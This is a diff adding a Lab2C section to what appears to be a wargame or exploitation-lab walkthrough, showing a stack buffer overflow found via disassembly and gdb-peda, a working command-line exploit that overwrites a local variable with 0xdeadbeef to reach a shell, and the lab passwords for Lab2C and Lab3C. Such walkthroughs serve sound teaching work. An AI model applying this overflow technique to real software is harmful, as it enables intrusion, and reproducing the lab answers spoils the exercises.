@@ -259,3 +259,56 @@ input += 3
 ```
 1uCKy_Gue55
 ```
+
+## Lab2C
+
+### Recon
+
+If we look closely into sourcecode, we observe, that there's an obvoius stack-based buffer-overflow bug in the way argv[1] gets handled. Aim is to overwrite local var ```set_me``` with hex value ```0xdeadbeef```, so that function ```shell()``` gets called. The only thing we just don't know yet is the offset we have to use to overwrite local var ```set_me```.
+
+Here's the interesting disassembly part
+```
+0x08048712	  call sym.imp.strcpy
+0x08048718	  cmp dword [esp + 0x2c], 0xdeadbeef
+0x08048720	  jne 0x8048729
+0x08048722	  call sym.shell
+```
+
+So we set a breakpoint before ```strcpy``` gets called and determine the offset between ```esp+0x2c``` (set_me) and our buffer in argv[1].
+
+```
+gdb-peda$ b *0x08048718
+gdb-peda$ r AAAA
+[...]
+gdb-peda$ searchmem "AAAA"
+Searching for 'AAAA' in: None ranges
+Found 2 results, display max 2 items:
+[stack] : 0xbffff69d ("AAAA")
+[stack] : 0xbffff89e ("AAAA")
+```
+
+So we have out buffer twice on stack. The one at higher address is the one originally located in main's argv. The lower one is the one that has been copied into main's stack frame after ```strcpy``` operation.
+
+```
+gdb-peda$ p/x ($esp+0x2c) - 0xbffff69d
+$1 = 0xf
+```
+
+We need an offset of 15 bytes to overwrite local var ```set_me```.
+
+```
+$ ./lab2C $(printf "A%.0s" {1..15})$(printf "\xef\xbe\xad\xde")
+You did it.
+$
+```
+
+### Pass Lab2C
+
+```
+1m_all_ab0ut_d4t_b33f
+```
+
+### Pass Lab3C
+```
+th3r3_iz_n0_4dm1ns_0n1y_U!
+```
